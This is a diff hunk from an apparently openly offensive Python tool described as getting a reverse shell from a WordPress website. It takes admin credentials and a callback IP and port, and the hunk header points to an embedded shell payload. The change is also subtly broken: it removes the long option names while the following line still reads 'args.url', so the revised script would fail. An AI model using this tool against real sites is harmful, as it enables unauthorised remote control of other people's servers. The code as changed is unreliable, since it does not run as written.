@@ -148,13 +148,13 @@ function printit ($string) {
 """
 
 def parse_args() -> tuple:
-    parser = argparse.ArgumentParser(description="Get a reverse shell from a WordPress website")
-    parser.add_argument("-u", "--url", help="The WordPress full path url", required=True)
-    parser.add_argument("-au", "--admin-username", help="The WordPress admin username", required=True)
-    parser.add_argument("-ap", "--admin-password", help="The WordPress admin password", required=True)
+    parser = argparse.ArgumentParser(description="Get reverse shell from WordPress website")
+    parser.add_argument("-u", help="URL to the WordPress site (e.g., http://example.com/)", metavar="URL", required=True)
+    parser.add_argument("-au", help="WordPress admin username", metavar="ADMIN_USER", required=True)
+    parser.add_argument("-ap", help="WordPress admin password", metavar="ADMIN_PASS", required=True)
     
-    parser.add_argument("-i", "--ip", help="Your local ip for the reverse shell", required=True)
-    parser.add_argument("-p", "--port", type=int, help="Your local port for the reverse shell", required=True)
+    parser.add_argument("-i", help="your local ip for the reverse shell", metavar="IP", required=True)
+    parser.add_argument("-p", type=int, help="your local port for the reverse shell", metavar="PORT", required=True)
     args = parser.parse_args()
 
     if(not args.url.startswith("http")):
